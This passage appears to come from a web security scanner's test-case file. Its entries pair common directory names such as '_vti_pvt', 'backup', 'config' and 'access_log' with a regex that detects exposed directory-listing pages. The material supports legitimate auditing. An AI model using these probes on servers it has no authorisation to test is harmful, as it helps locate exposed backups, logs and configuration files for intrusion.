        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "New Folder",
        "encode":  "YES",
    },

    {
        "case_id": 1060010011,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_sqladm",
        "encode":  "NO",
    },

    {
        "case_id": 1060010012,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_src",
        "encode":  "NO",
    },

    {
        "case_id": 1060010013,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_test",
        "encode":  "NO",
    },

    {
        "case_id": 1060010014,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_vti_adm",
        "encode":  "NO",
    },

    {
        "case_id": 1060010015,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_vti_aut",
        "encode":  "NO",
    },

    {
        "case_id": 1060010016,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_vti_bin",
        "encode":  "NO",
    },

    {
        "case_id": 1060010017,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_vti_pvt",
        "encode":  "NO",
    },

    {
        "case_id": 1060010018,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_www",
        "encode":  "NO",
    },

    {
        "case_id": 1060010019,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "access-log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010020,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "access_log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010021,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "accesslog",
        "encode":  "NO",
    },

    {
        "case_id": 1060010022,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "backup",
        "encode":  "NO",
    },

    {
        "case_id": 1060010023,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "backups",
        "encode":  "NO",
    },

    {
        "case_id": 1060010024,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "bak",
        "encode":  "NO",
    },

    {
        "case_id": 1060010025,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "bin",
        "encode":  "NO",
    },

    {
        "case_id": 1060010026,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "cache",
        "encode":  "NO",
    },

    {
        "case_id": 1060010027,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "cgi-bin",
        "encode":  "NO",
    },

    {
        "case_id": 1060010028,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "cgi-sys",
        "encode":  "NO",
    },

    {
        "case_id": 1060010029,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "conf",
        "encode":  "NO",
    },

    {
        "case_id": 1060010030,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "config",
        "encode":  "NO",
    },

    {
        "case_id": 1060010031,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "conn",
        "encode":  "NO",
    },

    {
        "case_id": 1060010032,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "csv",
        "encode":  "NO",
    },

    {
        "case_id": 1060010033,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "database",
        "encode":  "NO",
    },

    {
        "case_id": 1060010034,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "db",
        "encode":  "NO",
    },

    {
        "case_id": 1060010035,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "doc",
        "encode":  "NO",
    },

    {
        "case_id": 1060010036,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "docs",
        "encode":  "NO",
    },

    {
        "case_id": 1060010037,
